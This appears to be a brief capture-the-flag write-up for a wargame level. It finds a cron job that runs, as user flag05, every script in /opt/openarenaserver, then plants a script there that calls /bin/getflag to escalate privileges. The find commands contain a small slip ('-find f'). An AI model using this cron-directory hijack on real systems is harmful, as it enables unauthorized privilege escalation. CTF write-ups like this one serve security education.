# Level05 Writeup
 
## Info
 
User level05 has nothing in the home directory. Using `find / -user level05 -find f 2> /dev/null` finds the file `openarenaserver`

`openarenaserver`
``` bash
#!/bin/sh
 
for i in /opt/openarenaserver/* ; do
       (ulimit -t 5; bash -x "$i")
       rm -f "$i"
done
```
 
User level05 has also has mail in `/var/mail/level05` (found with `find / -name level05 -find f 2> /dev/null`):
```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
 
The file in /var/mail is a cron job that runs as flag05, executing `openarenaserver` every 2 minutes. Therefore we can create a script in /opt/openarenaserver that will call the `getflag` function and save it to a file like so:
 
``` bash
echo "/bin/getflag > /var/mail/flag05" > /opt/openarenaserver/exploit.sh
chmod +x /opt/openarenaserver/exploit.sh
```
 
 
 
 

